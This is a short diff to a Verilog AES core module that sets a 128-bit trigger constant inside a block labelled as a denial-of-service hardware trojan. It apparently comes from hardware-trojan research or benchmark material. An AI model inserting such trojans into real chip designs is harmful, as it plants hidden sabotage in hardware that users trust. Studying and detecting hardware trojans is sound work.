@@ -85,7 +85,7 @@ module aes_core(
 
   // TROJAN BEGIN: T05_dos_trojan
   wire [127:0] dos_trigger_value;
-  assign dos_trigger_value = dos_trigger_value;
+  assign dos_trigger_value = 128'hDEADBEEFCAFED00D0000000000000001;
   // TROJAN END: T05_dos_trojan
 
 /* verilator lint_off UNOPTFLAT */
